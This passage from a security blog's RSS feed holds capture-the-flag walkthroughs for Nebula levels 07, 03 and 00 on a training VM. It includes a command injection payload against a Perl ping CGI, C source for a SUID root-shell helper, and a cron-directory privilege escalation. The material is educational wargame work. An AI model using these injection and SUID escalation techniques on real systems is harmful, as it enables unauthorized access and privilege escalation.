 print(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Ping results&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;pre&amp;gt;&amp;quot;);

 @output = `ping -c 3 $host 2&amp;gt;&amp;amp;1`;
 foreach $line (@output) { print &amp;quot;$line&amp;quot;; } 

 print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;);  }  # check if Host set. if not, display normal page, etc  

 ping(param(&amp;quot;Host&amp;quot;));
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You can now browse to this script by going to http://&lt;nolink&gt;10.1.1.16:7007/index.cgi (assuming your Nebula VM is running on 10.1.1.16).  Unfortunately, since no parameters are being passed, it presents us with the usage of ping.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
            [-T tstamp-options] [-Q tos] [hop1 ...] destination
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The perl script takes a parameter named &amp;ldquo;Host&amp;rdquo;, and pipes it into the ping command.  Because of how poorly the perl script was written, we can inject more commands in there.  To make it easy, I made a quick HTML document to assist, so I didn&amp;rsquo;t have to do the encoding of spaces and symbols.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt; &amp;lt;body&amp;gt;
  &amp;lt;form action=&amp;quot;http://10.1.1.6:7007/index.cgi&amp;quot; method=&amp;quot;get&amp;quot;&amp;gt;
   &amp;lt;input name=&amp;quot;Host&amp;quot; id=&amp;quot;Host&amp;quot; type=&amp;quot;text&amp;quot; /&amp;gt;
   &amp;lt;input type=&amp;quot;submit&amp;quot; /&amp;gt;
  &amp;lt;/form&amp;gt;
 &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I can open that html file in my browser of choice, and when I submit, it&amp;rsquo;ll automatically do all the encoding for me, so I can just worry about the injection.&lt;/p&gt;

&lt;p&gt;In addition to the html page, I also modified my level03.c from a prior post, to make it more generic.  I saved this file as /tmp/bash_id.c:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main(int argc, char *argv[]){
    if (argc != 2)
        printf(&amp;quot;usage: %s &amp;lt;user id&amp;gt;\n&amp;quot;, argv[0]);
    else {
        int i = atoi(argv[1]);
        setresuid(i, i, i);
        setresgid(i, i, i);
        system( &amp;quot;/bin/bash&amp;quot; );
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This modified source file now takes a parameter of the user id you want to impersonate.  I want to impersonate the flag07 user, so I checked out the /etc/passwd file.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level07@nebula:/tmp$ cat /etc/passwd | grep flag07
flag07:x:992:992::/home/flag07:/bin/sh
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now I know that flag07 is also user 992.&lt;/p&gt;

&lt;p&gt;I opened the html file that I made, and in the textbox typed:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;;gcc -o level07 /tmp/bash_id.c;chmod +s,a+wrx level07
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When I clicked the submit button, it sent the final command of:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;ping -c 3 ;gcc -o level07 /tmp/bash_id.c;chmod +s,a+wrx level07 2&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It makes the ping program have incorrect usage, thus ending quickly.  It then compiles my newly written bash_id.c script, and places the executable in the /home/flag07 folder, and marks it executable and SUID.  From here, it was just as simple as executing that program with the 992 parameter, and running &amp;ldquo;getflag&amp;rdquo;.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level07@nebula:/home/flag07$ ./level07 992
flag07@nebula:/home/flag07$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 03</title>
      <link>https://www.mattandreko.com/blog/2011-12-04-exploit-exercises-nebula-03/</link>
      <pubDate>Sun, 04 Dec 2011 15:22:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2011-12-04-exploit-exercises-nebula-03/</guid>
      <description>&lt;p&gt;In &lt;a href=&#34;http://exploit-exercises.com/nebula/level03&#34;&gt;this&lt;/a&gt; challenge, we can see that there&amp;rsquo;s no code for us to exploit, it&amp;rsquo;s something in the system.
I log in to the system, and look in the /home/flag03 folder, as all the other challenges have started.  I see there&amp;rsquo;s a writable.sh script, which I was guessing was the script getting called on a crontab every couple minutes.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;It contained:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x &amp;quot;$i&amp;quot;)
        rm -f &amp;quot;$i&amp;quot;
done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this script looks like it will execute anything in the writable.d folder that we put in there.  And after some tinkering, I can see that it&amp;rsquo;s running it as the flag03 user that we want to escalate to.&lt;/p&gt;

&lt;p&gt;My first thoughts were to create a bash script like previous challenges, and have it get created with SUID permissions.  However this didn&amp;rsquo;t work, because apparently bash ignores the SUID bit, for security reasons.  I then read up on using perl, but couldn&amp;rsquo;t get it to work, due to perl&amp;rsquo;s built in protection.  Lastly, I settled on just good old C/C++. I spent forever messing around with this, because I was always setting the uid, but never the euid. When I forgot that, it would run bash, but I&amp;rsquo;d be the same user. I created this source file, and saved it to /tmp/level03.c&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;

int main()
{
    setresuid(996, 996, 996);
    setresgid(996, 996, 996);
    system( &amp;quot;/bin/bash&amp;quot; );
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;NOTE: The &amp;ldquo;996&amp;rdquo; is the userid and groupid for flag03.  I found this by just doing&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level03@nebula:/home/flag03$ cat /etc/passwd
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now that I have a source file, I need to get the flag03 user to compile it, and mark it SUID, so that when it runs, it works as the user specified.  I did it by using the following command:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level03@nebula:/home/flag03$ echo -e &#39;gcc -o /home/flag03/level03 /tmp/level03.c;chmod +s,a+rwx /home/flag03/level03&#39; &amp;gt; /home/flag03/writable.d/bash; chmod +x /home/flag03/writable.d/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This will create a bash script to get picked up by the cron job.  It first compiles the /tmp/level03.c code file and outputs the binary to /home/flag03/level03.  Afterwards it sets the permissions to allow executing (and more technically) as well as SUID.  After this command, I had to wait a couple minutes for it to get picked up by the cron job, but then I ran it, and got access to flag03.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level03@nebula:/home/flag03$ ./level03
flag03@nebula:/home/flag03$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Nebula 00</title>
      <link>https://www.mattandreko.com/blog/2011-12-01-exploit-exercises-nebula-00/</link>
      <pubDate>Thu, 01 Dec 2011 06:40:00 -0500</pubDate>
      
      <guid>https://www.mattandreko.com/blog/2011-12-01-exploit-exercises-nebula-00/</guid>
      <description>&lt;p&gt;Recently, I&amp;rsquo;ve been getting more and more back into computer security, one of my favorite topics. Part of this is research, and part is more practical, such as wargames or labs. One newer wargame that I&amp;rsquo;ve been playing is called &amp;ldquo;Nebula&amp;rdquo;, from the guys over at &lt;a href=&#34;http://exploit-exercises.com&#34;&gt;Exploit-Exercises&lt;/a&gt;. If you&amp;rsquo;re interested in security, please check out their site, as well as many other wargames. If this goes successfully, perhaps I&amp;rsquo;ll start going through my notes of otherwargames, publishing them as well.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;For &lt;a href=&#34;http://exploit-exercises.com/nebula/level00&#34;&gt;level 00&lt;/a&gt;, it&amp;rsquo;s fairly introductory. You&amp;rsquo;re supposed to find a SUID program, that you can run as the &amp;ldquo;flag00&amp;rdquo; user. I read a little on the find manual, since I don&amp;rsquo;t use the more advanced features often, and came up with this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level00@nebula:~$ find / -executable -user flag00 2&amp;gt; /dev/null
/home/flag00
/bin/.../flag00
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This find command, should show all files that are executable and owned by the user &amp;ldquo;flag00&amp;rdquo;. The &amp;ldquo;2&amp;gt; /dev/null&amp;rdquo; is just to redirect the standard error output to null, so I don&amp;rsquo;t see all the &amp;ldquo;Permission Denied&amp;rdquo; errors.  &lt;br /&gt;It looks like it found the flag00 user&amp;rsquo;s home folder, as well as an executable hidden in /bin/&amp;hellip;/. I then executed it, which granted me access to the flag00 user. From there, I ran the &amp;ldquo;getflag&amp;rdquo; command, which I don&amp;rsquo;t think actually does anything on this VM, but oh well.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;level00@nebula:~$ /bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:~$ getflag
You have successfully executed getflag on a target account
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There you have it, the first level down.  It was trivial, but still a good learning experience.&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>